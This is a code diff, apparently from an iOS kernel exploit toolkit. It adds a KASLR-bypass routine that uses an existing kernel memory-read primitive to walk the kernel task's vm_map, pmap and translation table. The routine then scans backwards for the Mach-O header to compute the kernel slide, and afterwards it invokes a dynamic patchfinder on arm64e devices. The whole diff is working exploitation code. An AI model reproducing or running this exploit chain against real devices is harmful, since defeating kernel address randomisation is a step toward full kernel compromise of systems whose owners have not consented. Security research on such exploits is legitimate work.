@@ -93,6 +93,40 @@ void kread_sem_open_kread(struct kfd* kfd, uint64_t kaddr, void* uaddr, uint64_t
     }
 }
 
+//thanks to @wh1te4ever!
+void kread_sem_open_kaslr(struct kfd* kfd, uint64_t task_kaddr)
+{
+    uint64_t kerntask_vm_map = 0;
+    kread_sem_open_kread(kfd, task_kaddr + 0x28, &kerntask_vm_map, sizeof(kerntask_vm_map));
+    kerntask_vm_map = kerntask_vm_map | 0xffffff8000000000;
+    
+    uint64_t kerntask_pmap = 0;
+    kread_sem_open_kread(kfd, kerntask_vm_map + 0x40, &kerntask_pmap, sizeof(kerntask_pmap));
+    kerntask_pmap = kerntask_pmap | 0xffffff8000000000;
+    
+    /* Pointer to the root translation table. */ /* translation table entry */
+    uint64_t kerntask_tte = 0;
+    kread_sem_open_kread(kfd, kerntask_pmap, &kerntask_tte, sizeof(kerntask_tte));
+    kerntask_tte = kerntask_tte | 0xffffff8000000000;
+    
+    uint64_t kerntask_tte_page = kerntask_tte & ~(0xfff);
+    
+    uint64_t kbase = 0;
+    while (true) {
+        uint64_t val = 0;
+        kread_sem_open_kread(kfd, kerntask_tte_page, &val, sizeof(val));
+        if(val == 0x100000cfeedfacf) {
+            kread_sem_open_kread(kfd, kerntask_tte_page + 0x18, &val, sizeof(val)); //check if mach_header_64->flags, mach_header_64->reserved are all 0
+            if(val == 0) {
+                kbase = kerntask_tte_page;
+                break;
+            }
+        }
+        kerntask_tte_page -= 0x1000;
+    }
+    kfd->info.kernel.kernel_slide = kbase - 0xFFFFFFF007004000;
+}
+
 void kread_sem_open_find_proc(struct kfd* kfd)
 {
     uint64_t pseminfo_kaddr = static_uget(psemnode, pinfo, kfd->kread.krkw_object_uaddr);
@@ -100,6 +134,13 @@ void kread_sem_open_find_proc(struct kfd* kfd)
     uint64_t task_kaddr = static_kget(semaphore, uint64_t, owner, semaphore_kaddr);
     uint64_t proc_kaddr = task_kaddr - dynamic_sizeof(proc);
     kfd->info.kernel.kernel_proc = proc_kaddr;
+    
+    if(isarm64e()) {
+        kread_sem_open_kaslr(kfd, task_kaddr);
+        print_x64(kfd->info.kernel.kernel_slide);
+        if(import_kfd_offsets() == -1)
+            do_dynamic_patchfinder(kfd, kfd->info.kernel.kernel_slide + 0xFFFFFFF007004000);
+    }
 
     /*
      * Go backwards from the kernel_proc, which is the last proc in the list.
